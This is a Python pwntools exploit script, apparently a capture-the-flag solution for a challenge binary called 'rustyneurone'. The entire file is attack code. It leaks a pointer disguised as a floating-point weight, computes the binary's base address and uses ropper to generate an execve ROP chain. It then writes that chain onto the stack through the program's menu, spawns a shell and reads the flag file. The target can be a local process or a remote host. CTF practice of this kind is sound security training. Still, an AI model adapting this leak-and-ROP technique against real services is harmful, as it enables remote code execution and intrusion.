#!/usr/bin/env python

# requires install ropper and pwntools:
# pip install pwn ropper

from pwn import *
import sys
import ropper


filename = "./rustyneurone"
leak_to_base = 0x67498

def etry(stack_ret_offset):

	rr=ropper.RopperService()
	rr.addFile(filename)
	rr.loadGadgetsFor()
	ggl = list(rr.search(""))
	ggstrl = [str(g[1])+"\n" for g in ggl]

	if len(sys.argv)<=1:
		io = process(filename)
	else:
		io = remote(sys.argv[1], int(sys.argv[2]))
	off = 0

	def bs(tstr):
		return str(tstr).encode("utf8")


	def get_gadget(gsearch):
		gg = [g for g in ggstrl if gsearch in g][0]
		return (int(gg.split(":")[0], 16), gg)


	def write_stack(vv):
		nonlocal off
		#io.interactive()
		io.send(b"1\n")
		io.send(b"0\n"*12)
		io.sendline(bs(vv))
		io.sendline(bs(stack_ret_offset+off))
		if vv < 1:
			io.send(b"3\n")
		else:
			io.send(b"1\n")
		#io.interactive()
		v=io.recvuntil(b"Exit\n")
		#print(repr(v))
		off+=1

	res = io.recvuntil(b"Exit\n")
	io.send(b"1\n"*16)
	res = io.recvuntil(b"Exit\n")
	print(repr(res))
	leaks = res.split(b"Weight 6 is:")[1].split()[0]
	print(repr(leaks))
	v = float(leaks)
	leak = struct.unpack("<Q",struct.pack("<d",v))[0]
	print(hex(leak))
	base = leak-leak_to_base
	print("base: ", hex(base))

	#raw_input()

	chainstr1 = rr.createRopChain("execve","x86_64")
	chainstr2 = chainstr1.split("rop = ''")[1].split("print")[0]
	ropstr = b""
	for line in chainstr2.split("\n"):
		if ("#") in line:
			line = line.split("#")[0]
		line = line.strip()
		if not line:
			continue
		print(line)
		if "rebase_0(" in line:
			ropstr += p64(int(line.split("(")[1].split(")")[0],16)+base)
		elif "p(" in line:
			ivalue = int(line.split("(")[1].split(")")[0],16)
			if ivalue >= 0x8000000000000000:
				ivalue -= 0x8000000000000000
			ropstr += p64(ivalue)
		elif "'" in line:
			ropstr += line.split("'")[1].split("'")[0].encode("utf8")
	print(repr(ropstr))
	print("ngadgets:", len(ropstr)/8)

	for i in range(0,len(ropstr),8):
		chunk = ropstr[i:i+8]
		#chunk = b'333333\xf3?' #b"\x01\x01\x01\xcc\xcc\xcc\xcc\x00"
		ichunk = struct.unpack("<Q",chunk)[0]
		nchunk = struct.unpack("<d",chunk)[0]
		nichunk = struct.unpack("<Q",struct.pack("<d",nchunk))[0]
		print(repr(chunk), hex(ichunk), nchunk, hex(nichunk))
		write_stack(nchunk)

	#io.interactive()

	io.sendline(bs(3))
	io.recvline()
	#io.recvline()
	#io.recvline()

	#io.recvline()
	time.sleep(0.1)
	io.sendline(b"\n\n")
	io.sendline(b"cat flag.txt")

	print("FLAG:", repr(io.recvuntil(b"}")))


etry(167)

'''
for i in range(150, 230):
	print("===>", i)
	try:
		etry(i)
	except EOFError:
		continue
	break
'''
